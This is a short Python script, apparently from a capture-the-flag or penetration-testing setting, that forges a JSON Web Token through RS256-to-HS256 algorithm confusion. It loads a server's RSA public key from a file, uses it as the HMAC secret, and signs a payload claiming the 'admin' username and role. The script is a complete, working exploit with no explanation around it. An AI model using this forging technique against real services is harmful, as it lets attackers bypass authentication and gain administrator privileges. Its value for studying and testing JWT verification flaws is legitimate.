
import hmac
import hashlib
import base64

file = open('publickey.pem')    #需要将文中的publickey下载	与脚本同目录
key = file.read()

# Paste your header and payload here
header = '{"typ": "JWT", "alg": "HS256"}'
payload = '{"username": "admin", "role": "admin"}'

# Creating encoded header
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# Creating encoded payload
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# Concatenating header and payload
token = (encodeHeader + "." + encodePayload)

# Creating signature
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")

print(token + "." + sig)


